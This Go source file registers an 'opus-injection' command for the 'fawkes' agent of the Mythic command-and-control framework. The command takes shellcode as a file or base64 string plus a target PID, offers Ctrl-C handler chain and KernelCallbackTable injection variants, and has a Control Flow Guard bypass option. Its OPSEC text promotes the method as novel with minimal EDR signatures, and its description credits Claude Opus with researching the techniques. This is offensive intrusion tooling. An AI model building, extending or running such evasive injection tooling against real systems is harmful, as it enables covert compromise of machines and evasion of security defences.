package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "opus-injection",
		Description:         "Perform novel callback-based process injection using unexplored Windows mechanisms. Named after Claude Opus who researched these techniques.",
		HelpString:          "opus-injection",
		Version:             1,
		MitreAttackMappings: []string{"T1055"}, // Process Injection
		SupportedUIFeatures: []string{"process_browser:inject"},
		Author:              "@galoryber",
		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "opusinjection_new.js"), Author: "@galoryber"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "variant",
				ModalDisplayName: "Injection Variant",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "The Opus injection variant to use",
				Choices: []string{
					"1 - Ctrl-C Handler Chain (console processes)",
					"4 - KernelCallbackTable (GUI processes)",
				},
				DefaultValue: "1 - Ctrl-C Handler Chain (console processes)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     1,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     1,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "CLI",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "The shellcode file to inject from files already registered in Mythic",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file to inject",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "shellcode_b64",
				ModalDisplayName: "Shellcode (Base64)",
				CLIName:          "shellcode_b64",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Base64-encoded shellcode (for CLI/API usage)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "CLI",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:                 "pid",
				ModalDisplayName:     "Target PID",
				CLIName:              "pid",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:          "The process ID to inject into (console process for Variant 1, GUI process for Variant 4)",
				DynamicQueryFunction: getProcessList,
				DefaultValue:         "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     2,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     2,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "CLI",
						UIModalPosition:     2,
					},
				},
			},
			{
				Name:             "cfg_bypass",
				ModalDisplayName: "CFG Bypass",
				CLIName:          "cfg_bypass",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "Mark shellcode allocation as a valid CFG call target (required on Windows 10/11 with Control Flow Guard enabled). Disable only if SetProcessValidCallTargets triggers EDR detection.",
				DefaultValue:     true,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
						UIModalPosition:     3,
					},
					{
						ParameterIsRequired: false,
						GroupName:           "New File",
						UIModalPosition:     3,
					},
					{
						ParameterIsRequired: false,
						GroupName:           "CLI",
						UIModalPosition:     3,
					},
				},
			},
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			pid, _ := taskData.Args.GetStringArg("pid")
			variant, _ := taskData.Args.GetStringArg("variant")
			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
			cfgNote := ""
			if cfgBypass {
				cfgNote = " CFG bypass enabled (SetProcessValidCallTargets — detectable by some EDRs)."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Opus injection (variant: %s) into PID %s. Callback-based injection using unexplored Windows mechanisms — novel technique with minimal EDR signatures.%s", variant, pid, cfgNote),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			pid, _ := taskData.Args.GetStringArg("pid")
			variant, _ := taskData.Args.GetStringArg("variant")
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    fmt.Sprintf("OPSEC AUDIT: Opus injection (variant: %s) queued for PID %s. Artifact registered.", variant, pid),
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			// Get the variant selection
			variantStr, err := taskData.Args.GetStringArg("variant")
			if err != nil {
				logging.LogError(err, "Failed to get variant")
				response.Success = false
				response.Error = "Failed to get injection variant: " + err.Error()
				return response
			}

			// Parse variant number from string like "1 - Ctrl-C Handler..."
			var variant int
			if len(variantStr) > 0 {
				fmt.Sscanf(variantStr, "%d", &variant)
			}

			if variant != 1 && variant != 4 {
				response.Success = false
				response.Error = fmt.Sprintf("Invalid variant: %d. Currently supported: 1, 4", variant)
				return response
			}

			// Check for direct base64 shellcode first (CLI/API usage)
			var shellcodeB64 string
			var filename string
			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
			if sc != "" {
				shellcodeB64 = sc
				filename = "(inline)"
			} else {
				fname, fileContents, fErr := resolveFileContents(taskData)
				if fErr != nil {
					response.Success = false
					response.Error = fErr.Error()
					return response
				}
				filename = fname
				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
			}

			// Get the target PID
			pid, err := parsePIDFromArg(taskData)
			if err != nil {
				logging.LogError(err, "Failed to get PID")
				response.Success = false
				response.Error = "Failed to get target PID: " + err.Error()
				return response
			}

			if pid <= 0 {
				response.Success = false
				response.Error = "Invalid PID specified (must be greater than 0)"
				return response
			}

			// Decode to get size for display
			scBytes, decErr := base64.StdEncoding.DecodeString(shellcodeB64)
			if decErr != nil {
				logging.LogError(decErr, "Failed to decode shellcode for size check")
			}

			// Build variant description
			variantDesc := "Unknown"
			targetNote := ""
			switch variant {
			case 1:
				variantDesc = "Ctrl-C Handler Chain Injection"
				targetNote = "Target must be a console process"
			case 4:
				variantDesc = "PEB KernelCallbackTable Injection"
				targetNote = "Target must be a GUI process with user32.dll loaded"
			}

			// Build the display parameters
			displayParams := fmt.Sprintf("Variant: %d (%s)\nShellcode: %s (%d bytes)\nTarget PID: %d\nNote: %s",
				variant, variantDesc, filename, len(scBytes), pid, targetNote)
			response.DisplayParams = &displayParams
			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Opus variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(scBytes)))

			// Build the actual parameters JSON that will be sent to the agent
			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
			params := map[string]interface{}{
				"shellcode_b64": shellcodeB64,
				"pid":           pid,
				"variant":       variant,
				"cfg_bypass":    cfgBypass,
			}

			paramsJSON, err := json.Marshal(params)
			if err != nil {
				logging.LogError(err, "Failed to marshal parameters")
				response.Success = false
				response.Error = "Failed to create task parameters: " + err.Error()
				return response
			}

			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			if strings.Contains(responseText, "success") || strings.Contains(responseText, "injected") || strings.Contains(responseText, "Success") || strings.Contains(responseText, "Injected") {
				l := len(responseText)
				if l > 200 {
					l = 200
				}
				createArtifact(processResponse.TaskData.Task.ID, "Process Injection", fmt.Sprintf("[opus-injection] %s", responseText[:l]))
			}
			return response
		},
	})
}
